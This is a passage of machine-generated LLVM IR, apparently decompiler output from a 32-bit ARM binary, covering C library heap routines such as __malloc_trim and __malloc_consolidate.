  %v2_132e0 = add i32 %v1_132d8, %v1_132dc
  %v1_132e4 = load i32, i32* @sb, align 4
  %v2_132e4 = add i32 %v2_132e0, %v1_132e4
  store i32 %v2_132e4, i32* %r3.global-to-local, align 4
  %v2_132e8 = sub i32 0, %v3_132d4
  %v3_132e8 = and i32 %v2_132e4, %v2_132e8
  store i32 %v3_132e8, i32* @r7, align 4
  %v2_132ec = sub i32 %v3_132e8, %v3_132d0
  store i32 %v2_132ec, i32* @fp, align 4
  %v9_132f0 = icmp eq i32 %v1_130e4, %v2_132ec
  br i1 %v9_132f0, label %dec_label_pc_13364, label %dec_label_pc_132f8

dec_label_pc_132f8:                               ; preds = %dec_label_pc_132c4
  %v2_132f8 = sub i32 %v1_130e0, %v3_132d0
  store i32 %v2_132f8, i32* %r0.global-to-local, align 4
  %v2_132fc = add i32 %v3_132d0, %v1_130e4
  store i32 %v2_132fc, i32* %r1.global-to-local, align 4
  store i32 %v3_132e8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_13308 = call i32 @mremap(i32 %v2_132f8, i32 %v2_132fc, i32 %v3_132e8, i32 1)
  store i32 %v4_13308, i32* %r0.global-to-local, align 4
  %v7_1330c = icmp eq i32 %v4_13308, -1
  br i1 %v7_1330c, label %dec_label_pc_13358, label %dec_label_pc_13314

dec_label_pc_13314:                               ; preds = %dec_label_pc_132f8
  %v1_13314 = load i32, i32* @r4, align 4
  %v2_13314 = add i32 %v1_13314, %v4_13308
  store i32 %v2_13314, i32* %r0.global-to-local, align 4
  %v0_13318 = load i32, i32* @fp, align 4
  %v1_13318 = or i32 %v0_13318, 2
  store i32 %v1_13318, i32* %r3.global-to-local, align 4
  %v2_1331c = add i32 %v2_13314, 4
  %v3_1331c = inttoptr i32 %v2_1331c to i32*
  store i32 %v1_13318, i32* %v3_1331c, align 4
  %v0_13320 = load i32, i32* @r8, align 4
  %v1_13320 = add i32 %v0_13320, 868
  %v2_13320 = inttoptr i32 %v1_13320 to i32*
  %v3_13320 = load i32, i32* %v2_13320, align 4
  store i32 %v3_13320, i32* %r3.global-to-local, align 4
  %v1_13324 = add i32 %v0_13320, 880
  %v2_13324 = inttoptr i32 %v1_13324 to i32*
  %v3_13324 = load i32, i32* %v2_13324, align 4
  store i32 %v3_13324, i32* %r2.global-to-local, align 4
  %v0_13328 = load i32, i32* @r6, align 4
  %v2_13328 = sub i32 %v3_13320, %v0_13328
  store i32 %v2_13328, i32* %r3.global-to-local, align 4
  %v1_1332c = load i32, i32* @r7, align 4
  %v2_1332c = add i32 %v1_1332c, %v2_13328
  store i32 %v2_1332c, i32* %r1.global-to-local, align 4
  %v1_13330 = add i32 %v0_13320, 872
  %v2_13330 = inttoptr i32 %v1_13330 to i32*
  %v3_13330 = load i32, i32* %v2_13330, align 4
  store i32 %v3_13330, i32* %r3.global-to-local, align 4
  %v1_13338 = add i32 %v0_13320, 884
  %v2_13338 = inttoptr i32 %v1_13338 to i32*
  %v3_13338 = load i32, i32* %v2_13338, align 4
  store i32 %v3_13338, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_1332c, %v3_13324
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_13314
  store i32 %v2_1332c, i32* %v2_13324, align 4
  %v0_13340.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13340.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_13314, %bb33
  %v1_13340 = phi i32 [ %v0_13320, %dec_label_pc_13314 ], [ %v1_13340.pre, %bb33 ]
  %v0_13340 = phi i32 [ %v2_1332c, %dec_label_pc_13314 ], [ %v0_13340.pre, %bb33 ]
  %v2_13340 = add i32 %v1_13340, 868
  %v3_13340 = inttoptr i32 %v2_13340 to i32*
  store i32 %v0_13340, i32* %v3_13340, align 4
  %v0_13344 = load i32, i32* %r1.global-to-local, align 4
  %v1_13344 = load i32, i32* %r3.global-to-local, align 4
  %v2_13344 = add i32 %v1_13344, %v0_13344
  store i32 %v2_13344, i32* %r1.global-to-local, align 4
  %v1_13348 = load i32, i32* %r2.global-to-local, align 4
  %v0_1334c = load i32, i32* %r0.global-to-local, align 4
  %v1_1334c = add i32 %v0_1334c, 8
  store i32 %v1_1334c, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_13344, %v1_13348
  br i1 %tmp43, label %bb35, label %dec_label_pc_13390

bb35:                                             ; preds = %bb34
  %v5_13350 = load i32, i32* @r8, align 4
  %v6_13350 = add i32 %v5_13350, 884
  %v7_13350 = inttoptr i32 %v6_13350 to i32*
  store i32 %v2_13344, i32* %v7_13350, align 4
  br label %dec_label_pc_13390

dec_label_pc_13358:                               ; preds = %dec_label_pc_132f8
  %v0_13358 = load i32, i32* @sb, align 4
  %v1_13358 = add i32 %v0_13358, 4
  store i32 %v1_13358, i32* %r3.global-to-local, align 4
  %v0_1335c = load i32, i32* @r6, align 4
  %v3_1335c = icmp ult i32 %v0_1335c, %v1_13358
  br i1 %v3_1335c, label %dec_label_pc_1336c, label %dec_label_pc_13358.dec_label_pc_13364_crit_edge

dec_label_pc_13358.dec_label_pc_13364_crit_edge:  ; preds = %dec_label_pc_13358
  %v0_13364.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13364

dec_label_pc_13364:                               ; preds = %dec_label_pc_13358.dec_label_pc_13364_crit_edge, %dec_label_pc_132c4
  %v0_13364 = phi i32 [ %v0_13364.pre, %dec_label_pc_13358.dec_label_pc_13364_crit_edge ], [ %v0_130cc, %dec_label_pc_132c4 ]
  store i32 %v0_13364, i32* @r4, align 4
  br label %dec_label_pc_13390

dec_label_pc_1336c:                               ; preds = %dec_label_pc_13358
  %v1_1336c = add i32 %v0_13358, -7
  store i32 %v1_1336c, i32* %r0.global-to-local, align 4
  %v1_13370 = call i32 @malloc(i32 %v1_1336c)
  store i32 %v1_13370, i32* @r0, align 4
  store i32 %v1_13370, i32* @r4, align 4
  %v2_13374 = icmp eq i32 %v1_13370, 0
  br i1 %v2_13374, label %dec_label_pc_13390, label %dec_label_pc_1337c

dec_label_pc_1337c:                               ; preds = %dec_label_pc_1336c
  %v0_1337c = load i32, i32* @r6, align 4
  %v1_1337c = add i32 %v0_1337c, -8
  store i32 %v1_1337c, i32* @r2, align 4
  %v0_13380 = load i32, i32* @r5, align 4
  store i32 %v0_13380, i32* @r1, align 4
  %v0_13384 = call i32 @memcpy()
  %v0_13388 = load i32, i32* @r5, align 4
  store i32 %v0_13388, i32* @r0, align 4
  %v0_1338c = call i32 @free()
  store i32 %v0_1338c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13390

dec_label_pc_13390:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_1336c, %dec_label_pc_13364, %dec_label_pc_132bc, %.thread6, %dec_label_pc_1312c, %dec_label_pc_1337c
  store i32 %v2_13080, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %r2.global-to-local, align 4
  %v4_133a0 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 24) to i32*), align 4
  store i32 %v4_133a0, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_133a0)
  br label %dec_label_pc_133ac

dec_label_pc_133ac:                               ; preds = %dec_label_pc_130b4, %dec_label_pc_1305c, %dec_label_pc_13044, %dec_label_pc_13390
  %v0_133ac = load i32, i32* @r4, align 4
  store i32 %v0_133ac, i32* %r0.global-to-local, align 4
  store i32 %v3_13024, i32* @r4, align 4
  store i32 %v6_13024, i32* @r5, align 4
  store i32 %v9_13024, i32* @r6, align 4
  store i32 %v12_13024, i32* @r7, align 4
  store i32 %v15_13024, i32* @r8, align 4
  store i32 %v18_13024, i32* @sb, align 4
  store i32 %v21_13024, i32* @sl, align 4
  store i32 %v24_13024, i32* @fp, align 4
  store i32 %v27_13024, i32* @lr, align 4
  ret i32 %v0_133ac

; uselistorder directives
  uselistorder i32 %v2_13344, { 1, 0, 2 }
  uselistorder i32 %v2_1332c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13308, { 1, 0, 2 }
  uselistorder i32 %v3_132e8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1328c, { 2, 1, 0 }
  uselistorder i32 %v2_1325c, { 1, 0, 2 }
  uselistorder i32 %v0_131f0, { 1, 0 }
  uselistorder i32 %v1_131ac, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_13110, { 0, 2, 1, 3 }
  uselistorder i32 %v2_13108, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_130ec, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_130e4, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_130e0, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_130d0, { 1, 0 }
  uselistorder i32 %v0_130cc, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_130ac, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 22, 13, 15, 14, 16, 23, 24, 17, 18, 19, 20, 21, 27, 26, 25, 28, 30, 29 }
  uselistorder i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 32) to i32*), { 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_133ac, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13390, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_132bc, { 1, 0 }
  uselistorder label %dec_label_pc_1325c, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_131a8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1319c, { 1, 0 }
  uselistorder label %dec_label_pc_13198, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_133c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_133c0:
  %v0_133c0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_133c0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_133c0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_133c0, %bb
  %v10_133d4 = phi i32 [ %arg1, %dec_label_pc_133c0 ], [ 0, %bb ]
  ret i32 %v10_133d4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_133d8 = add i32 %arg2, 44
  %v2_133d8 = inttoptr i32 %v1_133d8 to i32*
  %v3_133d8 = load i32, i32* %v2_133d8, align 4
  %v3_133dc = load i32, i32* @r4, align 4
  store i32 %v3_133dc, i32* %stack_var_-20, align 4
  %v12_133dc = load i32, i32* @r7, align 4
  %v1_133e0 = add i32 %v3_133d8, 4
  %v2_133e0 = inttoptr i32 %v1_133e0 to i32*
  %v3_133e0 = load i32, i32* %v2_133e0, align 4
  %v1_133e4 = add i32 %arg2, 860
  %v2_133e4 = inttoptr i32 %v1_133e4 to i32*
  %v3_133e4 = load i32, i32* %v2_133e4, align 4
  store i32 %v3_133e4, i32* @r4, align 4
  %v1_133e8 = and i32 %v3_133e0, -4
  store i32 %v1_133e8, i32* @r6, align 4
  %v1_133ec = add i32 %v1_133e8, -17
  %v2_133f0 = add i32 %v1_133ec, %v3_133e4
  store i32 %arg2, i32* @r5, align 4
  %v2_133fc = sub i32 %v2_133f0, %arg1
  store i32 %v3_133e4, i32* %r1.global-to-local, align 4
  %v2_13404 = udiv i32 %v2_133fc, %v3_133e4
  %v1_13408 = add i32 %v2_13404, -1
  store i32 %v1_13408, i32* %r0.global-to-local, align 4
  %v2_1340c = mul i32 %v1_13408, %v3_133e4
  store i32 %v2_1340c, i32* @r7, align 4
  %v2_13410 = icmp eq i32 %v2_1340c, 0
  store i1 %v2_13410, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_1340c, 1
  br i1 %tmp8, label %dec_label_pc_13478, label %dec_label_pc_13418

dec_label_pc_13418:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1341c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1341c, i32* %r0.global-to-local, align 4
  %v0_13420 = load i32, i32* @r5, align 4
  %v1_13420 = add i32 %v0_13420, 44
  %v2_13420 = inttoptr i32 %v1_13420 to i32*
  %v3_13420 = load i32, i32* %v2_13420, align 4
  %v0_13424 = load i32, i32* @r6, align 4
  %v2_13424 = add i32 %v0_13424, %v3_13420
  %v9_13428 = icmp eq i32 %v1_1341c, %v2_13424
  store i1 %v9_13428, i1* @cpsr_z, align 1
  store i32 %v1_1341c, i32* @r4, align 4
  br i1 %v9_13428, label %dec_label_pc_13434, label %dec_label_pc_13478

dec_label_pc_13434:                               ; preds = %dec_label_pc_13418
  %v0_13434 = load i32, i32* @r7, align 4
  %v1_13434 = sub i32 0, %v0_13434
  store i32 %v1_13434, i32* %r0.global-to-local, align 4
  %v1_13438 = call i32 @__GI_sbrk(i32 %v1_13434)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13440 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_13440, i32* %r0.global-to-local, align 4
  %v7_13444 = icmp eq i32 %v1_13440, -1
  store i1 %v7_13444, i1* @cpsr_z, align 1
  br i1 %v7_13444, label %dec_label_pc_13478, label %dec_label_pc_1344c

dec_label_pc_1344c:                               ; preds = %dec_label_pc_13434
  %v0_1344c = load i32, i32* @r4, align 4
  %v2_1344c = sub i32 %v0_1344c, %v1_13440
  store i32 %v2_1344c, i32* %r0.global-to-local, align 4
  %v9_1344c = icmp eq i32 %v0_1344c, %v1_13440
  store i1 %v9_1344c, i1* @cpsr_z, align 1
  br i1 %v9_1344c, label %dec_label_pc_13478, label %dec_label_pc_13454

dec_label_pc_13454:                               ; preds = %dec_label_pc_1344c
  %v0_13454 = load i32, i32* @r5, align 4
  %v1_13454 = add i32 %v0_13454, 872
  %v2_13454 = inttoptr i32 %v1_13454 to i32*
  %v3_13454 = load i32, i32* %v2_13454, align 4
  %v1_13458 = load i32, i32* @r6, align 4
  %v2_13458 = sub i32 %v1_13458, %v2_1344c
  store i32 %v2_13458, i32* %r2.global-to-local, align 4
  %v1_1345c = add i32 %v0_13454, 44
  %v2_1345c = inttoptr i32 %v1_1345c to i32*
  %v3_1345c = load i32, i32* %v2_1345c, align 4
  store i32 %v3_1345c, i32* %r1.global-to-local, align 4
  %v2_13460 = sub i32 %v3_13454, %v2_1344c
  %v1_13464 = or i32 %v2_13458, 1
  store i32 %v1_13464, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_13460, i32* %v2_13454, align 4
  %v0_13470 = load i32, i32* %r2.global-to-local, align 4
  %v1_13470 = load i32, i32* %r1.global-to-local, align 4
  %v2_13470 = add i32 %v1_13470, 4
  %v3_13470 = inttoptr i32 %v2_13470 to i32*
  store i32 %v0_13470, i32* %v3_13470, align 4
  %v1_13484.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1347c

dec_label_pc_13478:                               ; preds = %dec_label_pc_13418, %dec_label_pc_1344c, %dec_label_pc_13434, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1347c

dec_label_pc_1347c:                               ; preds = %dec_label_pc_13454, %dec_label_pc_13478
  %v1_13484 = phi i32 [ %v1_13484.pre, %dec_label_pc_13454 ], [ 0, %dec_label_pc_13478 ]
  %v2_13480 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13480, i32* @r4, align 4
  store i32 %v12_133dc, i32* @r7, align 4
  ret i32 %v1_13484

; uselistorder directives
  uselistorder i1 %v7_13444, { 1, 0 }
  uselistorder i32 %v1_13440, { 2, 1, 0, 3 }
  uselistorder i32 %v3_133e4, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1347c, { 1, 0 }
  uselistorder label %dec_label_pc_13478, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13488 = load i32, i32* @r4, align 4
  store i32 %v3_13488, i32* %stack_var_-36, align 4
  %v0_1348c = load i32, i32* @r0, align 4
  %v1_1348c = inttoptr i32 %v0_1348c to i32*
  %v2_1348c = load i32, i32* %v1_1348c, align 4
  store i32 %v2_1348c, i32* %r3.global-to-local, align 4
  %v2_13490 = icmp eq i32 %v2_1348c, 0
  store i32 %v0_1348c, i32* @r4, align 4
  br i1 %v2_13490, label %dec_label_pc_135c8.preheader, label %dec_label_pc_134a4

dec_label_pc_135c8.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_135d025 = add i32 %v0_1348c, 52
  store i32 %v1_135d025, i32* %r3.global-to-local, align 4
  %v2_135d826 = add i32 %v0_1348c, 60
  %v3_135d827 = inttoptr i32 %v2_135d826 to i32*
  store i32 %v1_135d025, i32* %v3_135d827, align 4
  %v0_135dc28 = load i32, i32* %r3.global-to-local, align 4
  %v2_135dc29 = add i32 %v0_135dc28, 12
  %v3_135dc30 = inttoptr i32 %v2_135dc29 to i32*
  store i32 %v0_135dc28, i32* %v3_135dc30, align 4
  br label %dec_label_pc_135c8.dec_label_pc_135c8_crit_edge

dec_label_pc_134a4:                               ; preds = %entry
  %v1_134a4 = and i32 %v2_1348c, -3
  %v3_134a8 = udiv i32 %v2_1348c, 8
  store i32 %v3_134a8, i32* %r2.global-to-local, align 4
  store i32 %v1_134a4, i32* %v1_1348c, align 4
  %v0_134b0 = load i32, i32* @r0, align 4
  %v1_134b0 = add i32 %v0_134b0, -4
  store i32 %v1_134b0, i32* %r3.global-to-local, align 4
  %v1_134b4 = load i32, i32* %r2.global-to-local, align 4
  %v4_134b4 = mul i32 %v1_134b4, 4
  %v5_134b4 = add i32 %v4_134b4, %v1_134b0
  store i32 %v5_134b4, i32* %sb.global-to-local, align 4
  %v1_134b8 = add i32 %v0_134b0, 52
  store i32 %v1_134b8, i32* %r7.global-to-local, align 4
  %v1_134bc = add i32 %v0_134b0, 4
  store i32 %v1_134bc, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_134c4

dec_label_pc_134c4:                               ; preds = %dec_label_pc_135c0, %dec_label_pc_134a4
  %v1_135b810 = phi i32 [ %v1_135b8, %dec_label_pc_135c0 ], [ %v5_134b4, %dec_label_pc_134a4 ]
  %v1_134d0 = phi i32 [ %v1_135c0, %dec_label_pc_135c0 ], [ %v1_134bc, %dec_label_pc_134a4 ]
  %v1_134c4 = inttoptr i32 %v1_134d0 to i32*
  %v2_134c4 = load i32, i32* %v1_134c4, align 4
  store i32 %v2_134c4, i32* %r1.global-to-local, align 4
  %v2_134c8 = icmp eq i32 %v2_134c4, 0
  br i1 %v2_134c8, label %dec_label_pc_135b8, label %dec_label_pc_134d0

dec_label_pc_134d0:                               ; preds = %dec_label_pc_134c4
  %v0_134d0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_134d0, i32* %v1_134c4, align 4
  %v0_134d4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_134d4

dec_label_pc_134d4:                               ; preds = %dec_label_pc_135ac, %dec_label_pc_134d0
  %v0_134f0 = phi i32 [ %v0_135ac, %dec_label_pc_135ac ], [ %v0_134d4.pre, %dec_label_pc_134d0 ]
  %v1_134d4 = add i32 %v0_134f0, 4
  %v2_134d4 = inttoptr i32 %v1_134d4 to i32*
  %v3_134d4 = load i32, i32* %v2_134d4, align 4
  store i32 %v3_134d4, i32* %r3.global-to-local, align 4
  %v1_134d8 = and i32 %v3_134d4, -2
  store i32 %v1_134d8, i32* %lr.global-to-local, align 4
  %v2_134dc = add i32 %v1_134d8, %v0_134f0
  store i32 %v2_134dc, i32* @r0, align 4
  %v1_134e0 = urem i32 %v3_134d4, 2
  %v2_134e0 = icmp eq i32 %v1_134e0, 0
  %v1_134e4 = add i32 %v0_134f0, 8
  %v2_134e4 = inttoptr i32 %v1_134e4 to i32*
  %v3_134e4 = load i32, i32* %v2_134e4, align 4
  store i32 %v3_134e4, i32* %sl.global-to-local, align 4
  %v1_134e8 = add i32 %v2_134dc, 4
  %v2_134e8 = inttoptr i32 %v1_134e8 to i32*
  %v3_134e8 = load i32, i32* %v2_134e8, align 4
  store i32 %v3_134e8, i32* %r8.global-to-local, align 4
  br i1 %v2_134e0, label %dec_label_pc_134f0, label %dec_label_pc_13524

dec_label_pc_134f0:                               ; preds = %dec_label_pc_134d4
  %v1_134f0 = inttoptr i32 %v0_134f0 to i32*
  %v2_134f0 = load i32, i32* %v1_134f0, align 4
  store i32 %v2_134f0, i32* %r5.global-to-local, align 4
  %v2_134f4 = sub i32 %v0_134f0, %v2_134f0
  store i32 %v2_134f4, i32* %r3.global-to-local, align 4
  %v1_134f8 = add i32 %v2_134f4, 8
  %v2_134f8 = inttoptr i32 %v1_134f8 to i32*
  %v3_134f8 = load i32, i32* %v2_134f8, align 4
  store i32 %v3_134f8, i32* %ip.global-to-local, align 4
  %v1_134fc = add i32 %v3_134f8, 12
  %v2_134fc = inttoptr i32 %v1_134fc to i32*
  %v3_134fc = load i32, i32* %v2_134fc, align 4
  store i32 %v3_134fc, i32* %r1.global-to-local, align 4
  %v9_13500 = icmp eq i32 %v3_134fc, %v2_134f4
  %v1_13504 = add i32 %v2_134f4, 12
  %v2_13504 = inttoptr i32 %v1_13504 to i32*
  %v3_13504 = load i32, i32* %v2_13504, align 4
  store i32 %v3_13504, i32* %r2.global-to-local, align 4
  br i1 %v9_13500, label %dec_label_pc_1350c, label %dec_label_pc_13568

dec_label_pc_1350c:                               ; preds = %dec_label_pc_134f0
  %v1_1350c = add i32 %v3_13504, 8
  %v2_1350c = inttoptr i32 %v1_1350c to i32*
  %v3_1350c = load i32, i32* %v2_1350c, align 4
  store i32 %v3_1350c, i32* %r3.global-to-local, align 4
  %v9_13510 = icmp eq i32 %v3_1350c, %v2_134f4
  br i1 %v9_13510, label %dec_label_pc_13518, label %dec_label_pc_13568

dec_label_pc_13518:                               ; preds = %dec_label_pc_1350c
  store i32 %v3_134f8, i32* %v2_1350c, align 4
  %v0_1351c = load i32, i32* %r2.global-to-local, align 4
  %v1_1351c = load i32, i32* %ip.global-to-local, align 4
  %v2_1351c = add i32 %v1_1351c, 12
  %v3_1351c = inttoptr i32 %v2_1351c to i32*
  store i32 %v0_1351c, i32* %v3_1351c, align 4
  %v0_13520 = load i32, i32* %lr.global-to-local, align 4
  %v1_13520 = load i32, i32* %r5.global-to-local, align 4
  %v2_13520 = add i32 %v1_13520, %v0_13520
  store i32 %v2_13520, i32* %lr.global-to-local, align 4
  %v0_13528.pre = load i32, i32* @r0, align 4
  %v0_1352c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13524

dec_label_pc_13524:                               ; preds = %dec_label_pc_134d4, %dec_label_pc_13518
  %v0_1359c = phi i32 [ %v1_134d8, %dec_label_pc_134d4 ], [ %v2_13520, %dec_label_pc_13518 ]
  %v0_1352c = phi i32 [ %v3_134e8, %dec_label_pc_134d4 ], [ %v0_1352c.pre, %dec_label_pc_13518 ]
  %v1_13540 = phi i32 [ %v2_134dc, %dec_label_pc_134d4 ], [ %v0_13528.pre, %dec_label_pc_13518 ]
  %v0_13524 = load i32, i32* @r4, align 4
  %v1_13524 = add i32 %v0_13524, 44
  %v2_13524 = inttoptr i32 %v1_13524 to i32*
  %v3_13524 = load i32, i32* %v2_13524, align 4
  store i32 %v3_13524, i32* %r3.global-to-local, align 4
  %v9_13528 = icmp eq i32 %v1_13540, %v3_13524
  %v1_1352c = and i32 %v0_1352c, -4
  store i32 %v1_1352c, i32* %r5.global-to-local, align 4
  br i1 %v9_13528, label %dec_label_pc_1359c, label %dec_label_pc_13534

dec_label_pc_13534:                               ; preds = %dec_label_pc_13524
  %v2_13534 = add i32 %v1_13540, %v1_1352c
  store i32 %v2_13534, i32* %r3.global-to-local, align 4
  %v1_13538 = add i32 %v2_13534, 4
  %v2_13538 = inttoptr i32 %v1_13538 to i32*
  %v3_13538 = load i32, i32* %v2_13538, align 4
  store i32 %v3_13538, i32* %r3.global-to-local, align 4
  %v1_1353c = urem i32 %v3_13538, 2
  %v2_1353c = icmp eq i32 %v1_1353c, 0
  %v2_13540 = add i32 %v1_13540, 4
  %v3_13540 = inttoptr i32 %v2_13540 to i32*
  store i32 %v1_1352c, i32* %v3_13540, align 4
  br i1 %v2_1353c, label %dec_label_pc_13548, label %dec_label_pc_13534.dec_label_pc_13578_crit_edge

dec_label_pc_13534.dec_label_pc_13578_crit_edge:  ; preds = %dec_label_pc_13534
  %v0_1357c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_13578

dec_label_pc_13548:                               ; preds = %dec_label_pc_13534
  %v0_13548 = load i32, i32* @r0, align 4
  %v1_13548 = add i32 %v0_13548, 8
  %v2_13548 = inttoptr i32 %v1_13548 to i32*
  %v3_13548 = load i32, i32* %v2_13548, align 4
  store i32 %v3_13548, i32* %ip.global-to-local, align 4
  %v1_1354c = add i32 %v3_13548, 12
  %v2_1354c = inttoptr i32 %v1_1354c to i32*
  %v3_1354c = load i32, i32* %v2_1354c, align 4
  store i32 %v3_1354c, i32* %r3.global-to-local, align 4
  %v9_13550 = icmp eq i32 %v3_1354c, %v0_13548
  %v1_13554 = add i32 %v0_13548, 12
  %v2_13554 = inttoptr i32 %v1_13554 to i32*
  %v3_13554 = load i32, i32* %v2_13554, align 4
  store i32 %v3_13554, i32* %r2.global-to-local, align 4
  br i1 %v9_13550, label %dec_label_pc_1355c, label %dec_label_pc_13568

dec_label_pc_1355c:                               ; preds = %dec_label_pc_13548
  %v1_1355c = add i32 %v3_13554, 8
  %v2_1355c = inttoptr i32 %v1_1355c to i32*
  %v3_1355c = load i32, i32* %v2_1355c, align 4
  store i32 %v3_1355c, i32* %r3.global-to-local, align 4
  %v9_13560 = icmp eq i32 %v3_1355c, %v0_13548
  br i1 %v9_13560, label %dec_label_pc_1356c, label %dec_label_pc_13568

dec_label_pc_13568:                               ; preds = %dec_label_pc_13548, %dec_label_pc_1350c, %dec_label_pc_134f0, %dec_label_pc_1355c
  %v0_13568 = call i32 @abort()
  store i32 %v0_13568, i32* @r0, align 4
  %v0_1356c.pre = load i32, i32* @ip, align 4
  %v1_1356c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1356c

dec_label_pc_1356c:                               ; preds = %dec_label_pc_1355c, %dec_label_pc_13568
  %v1_1356c = phi i32 [ %v3_13554, %dec_label_pc_1355c ], [ %v1_1356c.pre, %dec_label_pc_13568 ]
  %v0_1356c = phi i32 [ %v3_13548, %dec_label_pc_1355c ], [ %v0_1356c.pre, %dec_label_pc_13568 ]
  %v2_1356c = add i32 %v1_1356c, 8
  %v3_1356c = inttoptr i32 %v2_1356c to i32*
  store i32 %v0_1356c, i32* %v3_1356c, align 4
  %v0_13570 = load i32, i32* %r2.global-to-local, align 4
  %v1_13570 = load i32, i32* %ip.global-to-local, align 4
  %v2_13570 = add i32 %v1_13570, 12
  %v3_13570 = inttoptr i32 %v2_13570 to i32*
  store i32 %v0_13570, i32* %v3_13570, align 4
  %v0_13574 = load i32, i32* %lr.global-to-local, align 4
  %v1_13574 = load i32, i32* %r5.global-to-local, align 4
  %v2_13574 = add i32 %v1_13574, %v0_13574
  store i32 %v2_13574, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_13578

